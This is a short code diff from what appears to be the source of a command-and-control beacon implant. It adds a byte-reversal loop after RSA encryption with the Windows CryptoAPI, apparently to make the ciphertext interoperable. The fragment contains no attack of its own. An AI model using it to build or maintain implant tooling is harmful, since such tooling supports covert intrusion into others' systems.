@@ -126,6 +126,16 @@ DEFINESEC(B) BOOL CryptRsaEncrypt( PBEACON_INSTANCE Ins,
 
 			if ( Ins->api.CryptEncrypt( Ins->key[0].Key, 0, TRUE, 0, *Out, &TxtLen, EncLen ) )
 			{
+				PBYTE A = *Out;
+				BYTE  B = 0;
+
+				for ( int i=0;i<TxtLen/2;++i ) 
+				{
+					B = A[i]; 
+					A[i] = A[TxtLen - 1 - i]; 
+					A[TxtLen - 1 - i] = B;
+				};
+
 				*OutLen = TxtLen; return TRUE;
 			};
 			Ins->api.LocalFree( *Out );
